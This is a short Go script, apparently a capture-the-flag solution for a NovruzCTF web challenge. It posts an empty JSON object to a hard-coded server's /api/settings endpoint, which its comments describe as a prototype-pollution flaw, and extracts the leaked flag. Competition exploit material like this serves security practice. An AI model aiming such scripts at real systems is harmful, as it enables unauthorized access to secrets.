// =============================================================================
// 题目名称: Ghost Machine
// 题目类别: Web - 原型污染 (Prototype Pollution)
// 解题思路: /api/settings 接口存在原型污染漏洞，发送空 JSON 对象即可触发
//
//	flag 泄露
//
// 用法: go run NovruzCTF_The_Ghost_inside_the_Machine.go [目标地址]
//
//	示例: go run NovruzCTF_The_Ghost_inside_the_Machine.go http://95.111.234.103:3000
//
// =============================================================================
package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
)

const defaultAPIURL = "http://95.111.234.103:3000"

func main() {
	base := defaultAPIURL
	if len(os.Args) > 1 {
		base = os.Args[1]
	}

	endpoint := base + "/api/settings"
	resp, err := http.Post(endpoint, "application/json", bytes.NewBufferString("{}"))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] 请求失败: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	re := regexp.MustCompile(`novruzctf\{[^}]+\}`)
	m := re.Find(body)
	if m == nil {
		fmt.Fprintln(os.Stderr, "[!] 未找到 flag，响应内容:")
		fmt.Println(string(body))
		os.Exit(1)
	}
	fmt.Println(string(m))
}
